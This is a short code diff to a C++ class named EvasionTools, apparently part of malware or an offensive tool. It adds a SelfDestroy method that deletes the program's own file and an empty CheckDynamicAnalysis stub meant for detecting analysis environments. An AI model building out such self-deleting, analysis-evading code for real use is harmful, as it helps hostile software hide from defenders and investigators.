@@ -52,4 +52,13 @@ class EvasionTools{
 
 			return 0;
 		}
+		int SelfDestroy(){
+                        if (remove(Current.name))
+                                return 1;
+                        return 0;
+
+		}
+		int CheckDynamicAnalysis(){
+			return 0;
+		}
 };
